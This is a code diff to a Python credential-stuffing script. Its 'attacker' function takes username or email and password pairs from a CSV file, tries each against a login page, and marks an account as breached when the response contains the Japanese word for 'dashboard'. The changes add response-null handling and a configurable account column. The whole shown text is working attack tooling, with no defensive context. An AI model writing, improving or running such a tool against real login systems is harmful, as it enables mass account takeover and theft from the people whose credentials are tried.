@@ -81,11 +81,14 @@ def attacker(user, pass_, config):
             'upgrade-insecure-requests': '1',
         },
     })
-    if "ダッシュボード" in res.text:
-        print("User: {}, Pass: {}, Result: Succeeded".format(user, pass_))
+    if res is not None:
+        if "ダッシュボード" in res.text:
+            result = "Succeeded"
+        else:
+            result = "Failed"
+        print("User: {}, Pass: {}, Result: {}".format(user, pass_, result))
     else:
-        print("User: {}, Pass: {}, Result: Failed".format(user, pass_))
-
+        print("response doesn't exsit. maybe, one or more http-headers are wrong.")
     interval(config)
 
 
@@ -95,13 +98,15 @@ def main():
 
     with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../account_list.csv')))) as f:
         reader = csv.reader(f)
-        header = next(reader)
         if config.get('general', 'account') == "username":
-            for row in reader:
-                attacker(str(row[0]), str(row[2]), config)
+            account = 0
         elif config.get('general', 'account') == "email":
-            for row in reader:
-                attacker(str(row[1]), str(row[2]), config)
+            account = 1
+        else:
+            print("Warn: don't exsit setting and so, set username account")
+            account = 0
+        for row in reader:
+            attacker(str(row[account]), str(row[2]), config)
 
 
 if __name__ == '__main__':
